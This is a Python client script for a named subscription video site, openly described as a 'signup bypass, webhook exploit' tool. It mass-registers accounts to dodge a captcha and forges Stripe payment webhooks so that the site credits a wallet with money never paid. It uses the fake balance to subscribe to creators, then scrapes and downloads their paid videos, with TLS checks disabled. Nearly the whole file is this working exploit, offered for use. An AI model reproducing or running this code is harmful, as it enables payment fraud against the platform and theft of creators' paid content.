"""DoiFans API client — signup bypass, webhook exploit, subscription, video scraping."""

import re
import time
import urllib.parse
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings()

BASE_URL = "https://doifans.vip"


class DoiFans:
    def __init__(self, base_url=BASE_URL, proxy=None):
        self.base = base_url.rstrip("/")
        self.s = requests.Session()
        self.s.verify = False
        self.s.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "X-Requested-With": "XMLHttpRequest",
        })
        if proxy:
            self.s.proxies = {"https": proxy, "http": proxy}
        self.uid = None

    def _xsrf(self):
        tok = self.s.cookies.get("XSRF-TOKEN")
        return urllib.parse.unquote(tok) if tok else ""

    def _ensure_xsrf(self):
        if not self.s.cookies.get("XSRF-TOKEN"):
            self.s.get(f"{self.base}/", headers={"Accept": "text/html"}, timeout=60)

    def signup(self):
        """Register a fresh account (no captcha) and auto-login."""
        self._ensure_xsrf()
        uid = str(int(time.time() * 1000))[-8:]
        username = f"df{uid}"
        r = self.s.post(
            f"{self.base}/signup",
            headers={"Content-Type": "application/json", "X-XSRF-TOKEN": self._xsrf()},
            json={"name": username, "username": username,
                  "email": f"{username}@proton.me", "password": "X9k#mP2v!",
                  "password_confirmation": "X9k#mP2v!", "agree_gdpr": "1"},
            timeout=60,
        )
        if r.status_code == 200:
            try:
                data = r.json()
                if data.get("success"):
                    self.uid = None
                    return True
            except Exception:
                pass
        return False

    def login(self, username=None, password=None):
        """Try login with credentials; fall back to signup if captcha blocks."""
        self._ensure_xsrf()
        if username and password:
            r = self.s.post(
                f"{self.base}/login",
                headers={"Content-Type": "application/json", "X-XSRF-TOKEN": self._xsrf()},
                json={"username_email": username, "password": password},
                timeout=60,
            )
            if r.status_code == 200:
                try:
                    data = r.json()
                    if data.get("success"):
                        return True
                except Exception:
                    pass
        return self.signup()

    def login_with_cookie(self, cookie_str):
        """Inject a browser session cookie."""
        self._ensure_xsrf()
        if "=" in cookie_str:
            for part in cookie_str.split(";"):
                part = part.strip()
                if "=" in part:
                    k, v = part.split("=", 1)
                    self.s.cookies.set(k.strip(), v.strip())
        r = self.s.get(f"{self.base}/ajax/notifications",
                       headers={"X-Requested-With": "XMLHttpRequest"}, timeout=30)
        return r.status_code == 200 and "Unauthenticated" not in r.text

    def _get_my_uid(self):
        """Get current user's ID from settings page."""
        if self.uid:
            return self.uid
        r = self.s.get(f"{self.base}/settings/page", headers={"Accept": "text/html"}, timeout=30)
        m = re.search(r'data-userid="(\d+)"', r.text)
        if not m:
            m = re.search(r'(?:user_id|userId)["\s:=]+(\d{4,})', r.text)
        if m:
            self.uid = m.group(1)
        return self.uid

    def fund_wallet(self, amount=990, user_id=None):
        if not user_id:
            user_id = self._get_my_uid() or "36225"
        txn = str(int(time.time() * 1000))
        payload = {
            "type": "checkout.session.completed",
            "data": {"object": {
                "payment_status": "paid",
                "amount_total": amount * 100,
                "payment_intent": f"pi_{txn}",
                "metadata": {
                    "user": user_id, "amount": str(amount),
                    "taxes": "0", "type": "deposit", "transaction": txn,
                },
            }},
        }
        r = requests.post(
            f"{self.base}/stripe/webhook", json=payload,
            proxies=self.s.proxies, verify=False, timeout=30,
        )
        return "Webhook Handled" in r.text and "error" not in r.text.lower()

    def subscribe(self, creator_id):
        r = self.s.post(
            f"{self.base}/buy/subscription",
            headers={"Content-Type": "application/json", "X-XSRF-TOKEN": self._xsrf()},
            json={"id": str(creator_id), "interval": "monthly",
                  "payment_gateway": "wallet", "agree_terms": "1"},
            timeout=30,
        )
        data = r.json()
        if data.get("success"):
            return True
        msg = str(data.get("errors", ""))
        return "already" in msg.lower() or "活跃" in msg

    def resolve_creator(self, username):
        r = self.s.get(f"{self.base}/{username}", headers={"Accept": "text/html"}, timeout=30)
        if r.status_code != 200 or "Redirecting" in r.text[:300]:
            return None, 0
        m = re.search(r'data-userid="(\d+)"', r.text)
        cid = m.group(1) if m else None
        if not cid:
            m = re.search(r'\bid\s*=\s*(\d{4,})', r.text)
            cid = m.group(1) if m else None
        m = re.search(r'totalPosts\s*=\s*(\d+)', r.text)
        total = int(m.group(1)) if m else 0
        return cid, total

    def scrape_videos(self, username):
        pat = r'(?:src|data-src|source\s+src)="(https?://[^"]*?/public/uploads(?:_new)?/updates/videos/[^"]+\.mp4)"'
        r = self.s.get(f"{self.base}/{username}", headers={"Accept": "text/html"}, timeout=30)
        videos = re.findall(pat, r.text)
        cid, total = self.resolve_creator(username)
        if total > 5 and cid:
            for page in range(2, (total // 5) + 3):
                skip = (page - 1) * 5
                if skip >= total:
                    break
                ar = self.s.get(
                    f"{self.base}/ajax/updates",
                    params={"id": cid, "page": page, "skip": skip},
                    headers={"X-Requested-With": "XMLHttpRequest", "Accept": "text/html"},
                    timeout=30,
                )
                if ar.status_code != 200 or len(ar.text.strip()) < 50:
                    break
                videos.extend(re.findall(pat, ar.text))
        return sorted(set(videos))

    def download(self, urls, dest):
        dest = Path(dest)
        dest.mkdir(parents=True, exist_ok=True)
        results = []
        for url in urls:
            name = url.split("/")[-1]
            path = dest / name
            if path.exists() and path.stat().st_size > 1000:
                results.append({"file": str(path), "status": "skipped", "size": path.stat().st_size})
                continue
            r = requests.get(url, proxies=self.s.proxies, verify=False, stream=True, timeout=300)
            if r.status_code == 200:
                with open(path, "wb") as f:
                    for chunk in r.iter_content(1024 * 1024):
                        f.write(chunk)
                results.append({"file": str(path), "status": "ok", "size": path.stat().st_size})
            else:
                results.append({"file": str(path), "status": "failed", "http": r.status_code})
        return results
